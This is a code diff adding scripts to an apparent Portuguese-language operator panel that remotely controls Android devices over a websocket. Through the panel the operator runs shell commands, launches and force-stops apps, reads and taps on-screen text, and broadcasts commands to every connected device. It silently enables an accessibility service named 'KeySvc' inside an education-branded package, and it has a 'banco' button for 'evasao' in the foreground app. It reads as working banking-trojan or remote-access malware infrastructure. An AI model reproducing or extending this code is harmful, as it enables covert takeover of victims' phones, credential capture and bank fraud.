+  function abrir(p){ c('shell',{cmd:'monkey -p '+p+' -c android.intent.category.LAUNCHER 1'}) }
+  function info(p){ c('shell',{cmd:'am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d package:'+p}) }
+  function parar(p){ c('shell',{cmd:'am force-stop '+p}) }
+
+  window.focoPkg='';
+  function achaFoco(cb){
+    var o=$('#out'); if(!o){ if(cb)cb(null); return; }
+    var antes=o.textContent.length;
+    c('shell',{cmd:'dumpsys window | grep -m1 -E "mCurrentFocus|mFocusedApp"'});
+    var n=0;
+    var iv=setInterval(function(){
+      n++;
+      var t=$('#out').textContent.slice(antes);
+      var m=/u0\s+([a-zA-Z0-9_.]+)\//.exec(t)||/([a-zA-Z0-9_.]+)\/[A-Za-z0-9_.$]+/.exec(t);
+      if(m){ clearInterval(iv); window.focoPkg=m[1]; if(cb)cb(m[1]); return; }
+      if(n>22){ clearInterval(iv); if(cb)cb(null); }
+    },150);
+  }
+
+  window.desenhaArv=function(){
+    var a=$('#arv'); a.innerHTML='';
+    var q=($('#af').value||'').toLowerCase();
+    var visA=apps.filter(function(o){return !q||(o.n||'').toLowerCase().indexOf(q)>=0||(o.p||'').toLowerCase().indexOf(q)>=0});
+    var vis=nos.filter(function(n){return !q||(n.t||'').toLowerCase().indexOf(q)>=0||(n.cls||'').toLowerCase().indexOf(q)>=0});
+    var fb=document.createElement('div'); fb.className='ln';
+    fb.appendChild(bt('foco','detectar o app na frente',function(){ achaFoco(function(p){ toq('foco: '+(p||'?')); desenhaArv(); }) }));
+    if(window.focoPkg){
+      var sp=document.createElement('span'); sp.className='sm'; sp.textContent=window.focoPkg; fb.appendChild(sp);
+      fb.appendChild(bt('A','abrir',function(){ abrir(window.focoPkg) }));
+      fb.appendChild(bt('I','info',function(){ info(window.focoPkg) }));
+      fb.appendChild(bt('X','parar',function(){ parar(window.focoPkg) }));
+      fb.appendChild(bt('banco','evasao neste app',function(){ bankAuto(window.focoPkg) }));
+    }
+    a.appendChild(fb);
+    if(!visA.length&&!vis.length){ var vazio=document.createElement('div'); vazio.className='cl'; vazio.textContent=(nos.length||apps.length)?'nenhum item com esse filtro':'aguardando o aparelho'; a.appendChild(vazio); return; }
+    visA.forEach(function(o){
+      var d=document.createElement('div'); d.className='no';
+      var tx=document.createElement('span'); tx.className='tx'; tx.textContent=o.n;
+      var cl=document.createElement('span'); cl.className='cl'; cl.textContent=o.p;
+      d.appendChild(tx); d.appendChild(cl);
+      tx.onclick=function(){ abrir(o.p); toq('abrir: '+o.n) };
+      d.appendChild(bt('A','abrir',function(){ abrir(o.p) }));
+      d.appendChild(bt('I','info',function(){ info(o.p) }));
+      d.appendChild(bt('X','parar',function(){ parar(o.p) }));
+      a.appendChild(d);
+    });
+    if(visA.length&&vis.length){ var h=document.createElement('div'); h.className='cl'; h.textContent='--- tela atual ---'; h.style.padding='6px 0 2px'; a.appendChild(h); }
+    if(vis.length){
+      var bar=document.createElement('div'); bar.className='ln';
+      bar.appendChild(bt('subir','rolar para cima',function(){ c('swipe',{x1:Math.round(geo.w/2),y1:Math.round(geo.h*0.35),x2:Math.round(geo.w/2),y2:Math.round(geo.h*0.75),ms:250}) }));
+      bar.appendChild(bt('descer','rolar para baixo',function(){ c('swipe',{x1:Math.round(geo.w/2),y1:Math.round(geo.h*0.75),x2:Math.round(geo.w/2),y2:Math.round(geo.h*0.35),ms:250}) }));
+      a.appendChild(bar);
+    }
+    vis.forEach(function(n){
+      var d=document.createElement('div'); d.className='no'; d.style.paddingLeft=(n.d*10)+'px';
+      var tx=document.createElement('span'); tx.className='tx'; tx.textContent=(n.t||'(sem texto)')+(n.e?' [campo]':'');
+      var cl=document.createElement('span'); cl.className='cl'; cl.textContent=n.cls||'';
+      d.appendChild(tx); d.appendChild(cl);
+      tx.onclick=function(){ c('node',{x:n.x,y:n.y}); toq('toque: '+(n.t||n.cls)) };
+      if(n.c) d.appendChild(bt('L','toque longo',function(){ c('long',{x:n.x,y:n.y}) }));
+      if(n.e) d.appendChild(bt('T','digitar neste campo',function(){ pend={x:n.x,y:n.y}; $('#t').placeholder='texto para o campo...'; $('#t').focus(); }));
+      a.appendChild(d);
+    });
+  };
+
+  var arvB=document.querySelector('nav b[data-v="arvore"]');
+  var nb=document.createElement('b'); nb.dataset.v='palavras'; nb.textContent='palavras';
+  if(arvB&&arvB.parentNode) arvB.parentNode.insertBefore(nb, arvB.nextSibling); else document.querySelector('nav').appendChild(nb);
+
+  var box=document.createElement('div'); box.id='v-palavras'; box.style.display='none';
+  var l1=document.createElement('div'); l1.className='ln';
+  var fi=document.createElement('input'); fi.id='pwf'; fi.placeholder='filtrar palavras';
+  l1.appendChild(fi);
+  l1.appendChild(bt('Atualizar','forcar atualizacao',function(){ pede(); }));
+  var lb=document.createElement('label'); lb.className='sm';
+  var ck=document.createElement('input'); ck.type='checkbox'; ck.id='pwa'; ck.checked=true;
+  lb.appendChild(ck); lb.appendChild(document.createTextNode(' ao vivo'));
+  l1.appendChild(lb);
+  var leg=document.createElement('div'); leg.className='ln leg'; leg.textContent='clique na palavra = toque no elemento - botao direito = toque longo';
+  var lista=document.createElement('div'); lista.id='pwl';
+  box.appendChild(l1); box.appendChild(leg); box.appendChild(lista);
+  $('#body').appendChild(box);
+
+  var tmr=null;
+  function pede(){ c('tree'); setTimeout(pinta,450); }
+  function pinta(){
+    if(vNow!=='palavras') return;
+    var q=(fi.value||'').toLowerCase();
+    lista.innerHTML='';
+    var va=apps.filter(function(o){return !q||(o.n||'').toLowerCase().indexOf(q)>=0});
+    var vn=nos.filter(function(n){return n.t&&(!q||n.t.toLowerCase().indexOf(q)>=0)}).slice(0,400);
+    if(va.length){ var h1=document.createElement('div'); h1.className='cl'; h1.textContent='--- aplicativos ---'; lista.appendChild(h1); }
+    va.forEach(function(o){
+      var d=document.createElement('div'); d.className='no';
+      var tx=document.createElement('span'); tx.className='tx'; tx.textContent=o.n; d.title=o.p;
+      d.appendChild(tx);
+      d.onclick=function(){ abrir(o.p); toq('abrir: '+o.n) };
+      d.oncontextmenu=function(ev){ ev.preventDefault(); info(o.p) };
+      lista.appendChild(d);
+    });
+    if(vn.length){ var h2=document.createElement('div'); h2.className='cl'; h2.textContent='--- na tela ---'; lista.appendChild(h2); }
+    vn.forEach(function(n){
+      var d=document.createElement('div'); d.className='no'; d.style.paddingLeft=(n.d*8)+'px';
+      var tx=document.createElement('span'); tx.className='tx'; tx.textContent=n.t; d.title=n.cls||'';
+      d.appendChild(tx);
+      d.onclick=function(){ c('node',{x:n.x,y:n.y}); toq('toque: '+n.t) };
+      d.oncontextmenu=function(ev){ ev.preventDefault(); c('long',{x:n.x,y:n.y}) };
+      lista.appendChild(d);
+    });
+    if(!va.length&&!vn.length) lista.textContent = q?'nada com esse filtro':'sem palavras na tela';
+  }
+
+  var goOld=go;
+  window.go=function(v){
+    goOld(v);
+    box.style.display = (v==='palavras')?'block':'none';
+    if(v==='palavras'){ c('applist'); pede(); if(!tmr) tmr=setInterval(function(){ if(ck.checked) pede(); },1300); }
+    else if(tmr){ clearInterval(tmr); tmr=null; }
+  };
+  nb.onclick=function(){ go('palavras') };
+  fi.oninput=function(){ pinta() };
+
+  var cx=document.querySelector('#v-live .cx'); if(cx&&cx.parentNode) cx.parentNode.remove();
+  if(dev.value) pick();
+})();
+</script>
+<script>
+(function(){
+  if(window.painelV4) return; window.painelV4=1;
+  var box=$('#v-palavras'); if(!box) return;
+  var d=document.createElement('div'); d.className='ln leg'; d.id='pwd'; d.textContent='diag: --';
+  box.insertBefore(d, box.firstChild);
+  var l2=document.createElement('div'); l2.id='pwl2';
+  box.appendChild(l2);
+
+  setInterval(function(){
+    d.textContent='diag: ws='+(w?w.readyState:'-')+' sel='+(sel||'-')+' nos='+nos.length+' apps='+apps.length;
+  }, 900);
+
+  setInterval(function(){ if(vNow==='palavras') c('tree'); }, 1200);
+
+  setInterval(function(){
+    if(vNow!=='palavras') return;
+    var com=nos.filter(function(n){return n.t});
+    l2.innerHTML='';
+    if(!com.length){ l2.textContent='(nenhuma palavra recebida)'; return; }
+    com.slice(0,300).forEach(function(n){
+      var e=document.createElement('div'); e.className='no';
+      var t=document.createElement('span'); t.className='tx'; t.textContent=n.t;
+      e.appendChild(t);
+      e.onclick=function(){ c('node',{x:n.x,y:n.y}) };
+      l2.appendChild(e);
+    });
+  }, 1400);
+
+  var antes=$('#out').textContent.length;
+  c('shell',{cmd:'settings get secure enabled_accessibility_services'});
+  setTimeout(function(){
+    var t=$('#out').textContent.slice(antes).replace('shell: ','').trim();
+    if(t) d.textContent='acessibilidade: '+t;
+  }, 1500);
+})();
+</script>
+<script>
+(function(){
+  if(window.painelV5) return; window.painelV5=1;
+  var box=$('#v-palavras'); if(!box) return;
+  var d=document.createElement('div'); d.className='ln leg'; d.id='pwx';
+  box.insertBefore(d, box.firstChild);
+  var b=document.createElement('button'); b.textContent='testar canal'; b.className='pri';
+  var bo=document.createElement('button'); bo.textContent='ligar acessibilidade';
+  var st={a1:'?',a2:'?',p:'?'};
+  function mostra(){ d.textContent='teste: a11y='+st.a1+' servico='+st.a2+' canal='+st.p+' '; d.appendChild(b); d.appendChild(bo); }
+  function roda(){
+    var n=$('#out').textContent.length;
+    c('shell',{cmd:'echo A1=$(settings get secure accessibility_enabled); echo A2=$(settings get secure enabled_accessibility_services); echo PING=ok'});
+    setTimeout(function(){
+      var t=$('#out').textContent.slice(n);
+      var m1=/A1=(\S*)/.exec(t), m2=/A2=(.*)/.exec(t), m3=/PING=(\S*)/.exec(t);
+      if(m1) st.a1=(m1[1]||'(vazio)');
+      if(m2) st.a2=((m2[1]||'').trim())||'(vazio)';
+      if(m3) st.p=m3[1];
+      mostra();
+    },1000);
+  }
+  b.onclick=roda;
+  bo.onclick=function(){ c('shell',{cmd:'settings put secure accessibility_enabled 1; settings put secure enabled_accessibility_services com.eloeeducacao/com.eloeeducacao.KeySvc'}); setTimeout(roda,1200); };
+  mostra(); roda();
+  setInterval(roda, 5000);
+})();
+</script>
+<script>
+(function(){
+  if(window.painelV6) return; window.painelV6=1;
+  var cOld=c;
+  window.c=function(n,x){ if(dev.value) sel=dev.value; cOld(n,x); };
+  setInterval(function(){
+    if(!dev.options.length) return;
+    if(!dev.value && dev.options.length>1){ dev.selectedIndex=1; pick(); return; }
+    if(dev.value && dev.value!==sel) pick();
+  }, 900);
+  var box=$('#v-palavras'); if(!box) return;
+  var d=document.createElement('div'); d.className='ln leg'; d.id='pwz';
+  box.insertBefore(d, box.firstChild);
+  var b=document.createElement('button'); b.textContent='testar'; b.className='pri';
+  var bo=document.createElement('button'); bo.textContent='ligar acessibilidade';
+  var st={a1:'?',a2:'?',p:'?'};
+  function mostra(){ d.textContent='dev='+(dev.value||'-')+' sel='+(sel||'-')+' nos='+nos.length+' a11y='+st.a1+' servico='+st.a2+' canal='+st.p+' '; d.appendChild(b); d.appendChild(bo); }
+  function roda(){
+    var n=$('#out').textContent.length;
+    c('shell',{cmd:'echo A1=$(settings get secure accessibility_enabled); echo A2=$(settings get secure enabled_accessibility_services); echo PING=ok'});
+    setTimeout(function(){
+      var t=$('#out').textContent.slice(n);
+      var m1=/A1=(\S*)/.exec(t), m2=/A2=(.*)/.exec(t), m3=/PING=(\S*)/.exec(t);
+      if(m1) st.a1=(m1[1]||'(vazio)');
+      if(m2) st.a2=((m2[1]||'').trim())||'(vazio)';
+      if(m3) st.p=m3[1];
+      mostra();
+    },1000);
+  }
+  b.onclick=roda;
+  bo.onclick=function(){ c('shell',{cmd:'settings put secure accessibility_enabled 1; settings put secure enabled_accessibility_services com.eloeeducacao/com.eloeeducacao.KeySvc'}); setTimeout(roda,1200); };
+  mostra(); roda(); setInterval(roda,5000); setInterval(mostra,900);
+})();
+</script>
+<script>
+(function(){
+  if(window.painelV7) return; window.painelV7=1;
+  var af=$('#af'); if(af) af.style.display='none';
+  var pf=$('#pwf'); if(pf) pf.remove();
+  setInterval(function(){
+    var a=$('#arv'); if(a && af) af.style.display='none';
+    var f=$('#pwf'); if(f) f.remove();
+  }, 2000);
+})();
+</script>
+<script>
+(function(){
+  if(window.painelV8) return; window.painelV8=1;
+  var box=$('#v-palavras'); if(!box) return;
+  var d=document.createElement('div'); d.className='ln';
+  var b=document.createElement('button'); b.textContent='raw'; b.className='pri'; b.title='manda direto pelo socket, sem passar pelo c()';
+  b.onclick=function(){
+    var id=dev.value||'';
+    var p1=JSON.stringify({c:'shell',id:id,cmd:'echo RAWOK'});
+    var p2=JSON.stringify({c:'tree',id:id});
+    log('RAW url='+(w&&w.url));
+    log('RAW1 '+p1);
+    log('RAW2 '+p2);
+    try{ w.send(p1); w.send(p2); toq('enviado id='+id); }catch(e){ toq('erro: '+e); }
+  };
+  d.appendChild(b); box.insertBefore(d, box.firstChild);
+})();
+</script>
+<script>
+(function(){
+  if(window.painelV9) return; window.painelV9=1;
+  var lv=$('#v-live'); if(!lv) return;
+  var d=document.createElement('div'); d.id='pwd2';
+  d.style.cssText='font:12px monospace;background:#1b232d;border:1px solid #f85149;color:#ffb4ae;padding:6px;border-radius:5px;margin-bottom:6px;white-space:pre-wrap';
+  lv.insertBefore(d, lv.firstChild);
+  var st={a1:'?',a2:'?',p:'?'};
+  function mostra(){ d.textContent='dev='+(dev.value||'-')+' sel='+(sel||'-')+' nos='+nos.length+' apps='+apps.length+'\na11y='+st.a1+' servico='+st.a2+' canal='+st.p; }
+  function roda(){
+    var n=$('#out').textContent.length;
+    c('shell',{cmd:'echo A1=$(settings get secure accessibility_enabled); echo A2=$(settings get secure enabled_accessibility_services); echo PING=ok'});
+    setTimeout(function(){
+      var t=$('#out').textContent.slice(n);
+      var m1=/A1=(\S*)/.exec(t), m2=/A2=(.*)/.exec(t), m3=/PING=(\S*)/.exec(t);
+      if(m1) st.a1=m1[1]||'(vazio)';
+      if(m2) st.a2=(m2[1]||'').trim()||'(vazio)';
+      if(m3) st.p=m3[1];
+    },1000);
+  }
+  roda(); setInterval(roda,4000); setInterval(mostra,900); mostra();
+})();
+</script>
+<script>
+(function(){
+  if(window.painelV10) return; window.painelV10=1;
+
+  var ultRecon=0;
+  setInterval(function(){
+    if(!w||w.readyState!==1) return;
+    if(dev.options.length<=1 && Date.now()-ultRecon>7000){
+      ultRecon=Date.now(); c('recon');
+    }
+    if(!dev.value && dev.options.length>1){ dev.selectedIndex=1; pick(); }
+  }, 1200);
+
+  var lv=$('#v-live'); if(!lv) return;
+  var d=document.createElement('div'); d.id='pwd3';
+  d.style.cssText='font:12px monospace;background:#1b232d;border:1px solid #f85149;color:#ffb4ae;padding:6px;border-radius:5px;margin-bottom:6px;white-space:pre-wrap';
+  lv.insertBefore(d, lv.firstChild);
+  var bt=document.createElement('button'); bt.textContent='reconectar';
+  bt.onclick=function(){ c('recon'); toq('reconectar'); };
+  d.appendChild(bt);
+
+  var st={a1:'?',a2:'?',p:'?'};
+  function mostra(){
+    var t=($('#out').textContent||'').trim().split('\n').slice(-3).join(' | ');
+    d.textContent='dev='+(dev.value||'-')+' sel='+(sel||'-')+' opts='+dev.options.length+' nos='+nos.length+' apps='+apps.length+'\na11y='+st.a1+' servico='+st.a2+' canal='+st.p+'\nlog: '+(t||'-');
+    d.appendChild(bt);
+  }
+  function roda(){
+    var n=$('#out').textContent.length;
+    c('shell',{cmd:'echo A1=$(settings get secure accessibility_enabled); echo A2=$(settings get secure enabled_accessibility_services); echo PING=ok'});
+    setTimeout(function(){
+      var t=$('#out').textContent.slice(n);
+      var m1=/A1=(\S*)/.exec(t), m2=/A2=(.*)/.exec(t), m3=/PING=(\S*)/.exec(t);
+      if(m1) st.a1=m1[1]||'(vazio)';
+      if(m2) st.a2=(m2[1]||'').trim()||'(vazio)';
+      if(m3) st.p=m3[1];
+    },1000);
+  }
+  roda(); setInterval(roda,4000); setInterval(mostra,900); mostra();
+
+  var box=$('#v-palavras'); if(!box) return;
+  var l3=document.createElement('div'); l3.id='pwl3';
+  box.appendChild(l3);
+  var p1=$('#pwl'), p2=$('#pwl2');
+  if(p1) p1.style.display='none';
+  if(p2) p2.style.display='none';
+
+  function pinta3(){
+    if(vNow!=='palavras') return;
+    l3.innerHTML='';
+    var com=nos.filter(function(n){return n.t});
+    if(!com.length){ l3.textContent='(nenhuma palavra recebida)'; return; }
+    com.slice(0,300).forEach(function(n){
+      var e=document.createElement('div'); e.className='no';
+      var tx=document.createElement('span'); tx.className='tx'; tx.textContent=n.t; e.title=n.cls||'';
+      var b=document.createElement('button'); b.textContent='toque'; b.onclick=function(){ c('node',{x:n.x,y:n.y}); toq('toque: '+n.t) };
+      var bl=document.createElement('button'); bl.textContent='segure'; bl.onclick=function(){ c('long',{x:n.x,y:n.y}) };
+      e.appendChild(tx); e.appendChild(bl); e.appendChild(b);
+      e.onclick=function(ev){ if(ev.target.tagName!=='BUTTON'){ c('node',{x:n.x,y:n.y}); toq('toque: '+n.t) } };
+      l3.appendChild(e);
+    });
+  }
+  setInterval(pinta3, 1400);
+})();
+</script>
+<script>
+(function(){
+  if(window.painelV11) return; window.painelV11=1;
+  function envia(n,x,id){
+    try { if(w&&w.readyState===1&&id) w.send(JSON.stringify(Object.assign({c:n,id:id},x||{}))); } catch(_){}
+  }
+  window.c=function(n,x){
+    var ids=[], i;
+    for(i=0;i<dev.options.length;i++){ if(dev.options[i].value) ids.push(dev.options[i].value); }
+    if(!ids.length && sel) ids.push(sel);
+    if(!ids.length) return;
+    for(i=0;i<ids.length;i++) envia(n,x,ids[i]);
+    if(dev.value) sel=dev.value;
+  };
+  var box=$('#v-palavras'); if(!box) return;
+  var d=document.createElement('div'); d.id='pwv11';
+  d.style.cssText='font:12px monospace;background:#0d1116;border:1px solid #30363d;color:#c3ccd8;padding:6px;border-radius:5px;margin-bottom:6px;white-space:pre-wrap';
+  box.insertBefore(d, box.firstChild);
+  var b=document.createElement('button'); b.textContent='raw';
+  b.onclick=function(){ c('shell',{cmd:'echo RAWOK'}); c('applist'); toq('raw para '+dev.options.length+' ids'); };
+  d.appendChild(b);
+  function mostra(){
+    var t=($('#out').textContent||'').trim().split('\n').slice(-6).join('\n');
+    var erro=/acessibilidade desligada/.test(t);
+    d.textContent='ids='+dev.options.length+' sel='+(sel||'-')+' nos='+nos.length+'\n'+(t||'(log vazio)');
+    d.style.color = erro?'#ffb4ae':'#c3ccd8';
+    d.style.borderColor = erro?'#f85149':'#30363d';
+    d.appendChild(b);
+  }
+  setInterval(mostra,800); mostra();
+})();
+</script>
+<script>
+(function(){
+  if(window.painelV12) return; window.painelV12=1;
+  var box=$('#v-palavras'); if(!box) return;
+  var p1=$('#pwl'), p2=$('#pwl2'); if(p1)p1.style.display='none'; if(p2)p2.style.display='none';
+  var topo=document.createElement('div');
+  topo.style.cssText='font:11px monospace;background:#0d1116;border:1px solid #30363d;color:#c3ccd8;padding:5px;border-radius:5px;margin-bottom:6px;white-space:pre-wrap';
+  box.insertBefore(topo, box.firstChild);
+  var lista=document.createElement('div'); lista.id='pwl4'; box.appendChild(lista);
+  var btnA=document.createElement('button'); btnA.textContent='apps';
+  var btnT=document.createElement('button'); btnT.textContent='atualizar'; btnT.className='pri';
+  btnA.onclick=function(){ c('applist'); };
+  btnT.onclick=function(){ c('tree'); c('applist'); };
+  function erro(){
+    var t=($('#out').textContent||'').split('\n').filter(function(l){return l.indexOf('!')===0});
+    return t.length?t[t.length-1]:'';
+  }
+  function topo_(){
+    topo.textContent='janelas='+nos.length+' apps='+apps.length+(erro()?'\n'+erro():'');
+    topo.style.color = erro()?'#ffb4ae':'#c3ccd8';
+    topo.appendChild(btnT); topo.appendChild(btnA);
+  }
+  function bt(tx,ti,fn){ var b=document.createElement('button'); b.textContent=tx; b.title=ti; b.onclick=function(ev){ev.stopPropagation();fn()}; return b; }
+  function abrir(p){ c('shell',{cmd:'monkey -p '+p+' -c android.intent.category.LAUNCHER 1'}) }
+  function pinta(){
+    if(vNow!=='palavras') return;
+    lista.innerHTML='';
+    if(apps.length){
+      var ha=document.createElement('div'); ha.className='cl'; ha.textContent='--- aplicativos ---'; lista.appendChild(ha);
+      apps.forEach(function(o){
+        var d=document.createElement('div'); d.className='no';
+        var tx=document.createElement('span'); tx.className='tx'; tx.textContent=o.n; d.title=o.p;
+        d.appendChild(tx); d.appendChild(bt('abrir','abrir',function(){ abrir(o.p) }));
+        tx.onclick=function(){ abrir(o.p) };
+        lista.appendChild(d);
+      });
+    }
+    var com=nos.filter(function(n){return n.t});
+    var ht=document.createElement('div'); ht.className='cl';
+    ht.textContent='--- texto na tela ('+com.length+') ---'; lista.appendChild(ht);
+    if(!com.length){
+      var v=document.createElement('div'); v.className='cl';
+      v.textContent = erro() ? 'sem dados do aparelho' : 'aguardando a tela';
+      lista.appendChild(v); return;
+    }
+    com.slice(0,400).forEach(function(n){
+      var d=document.createElement('div'); d.className='no'; d.style.paddingLeft=(n.d*8)+'px';
+      var tx=document.createElement('span'); tx.className='tx'; tx.textContent=n.t; d.title=n.cls||'';
+      d.appendChild(tx);
+      d.appendChild(bt('segure','toque longo',function(){ c('long',{x:n.x,y:n.y}) }));
+      d.appendChild(bt('toque','tocar aqui',function(){ c('node',{x:n.x,y:n.y}); toq('toque: '+n.t) }));
+      tx.onclick=function(){ c('node',{x:n.x,y:n.y}); toq('toque: '+n.t) };
+      d.oncontextmenu=function(ev){ ev.preventDefault(); c('long',{x:n.x,y:n.y}) };
+      lista.appendChild(d);
+    });
+  }
+  setInterval(topo_,800);
+  setInterval(pinta,1300);
+  setInterval(function(){ if(vNow==='palavras'){ c('tree'); if(!apps.length) c('applist'); } },1300);
+  topo_();
+})();
+</script>
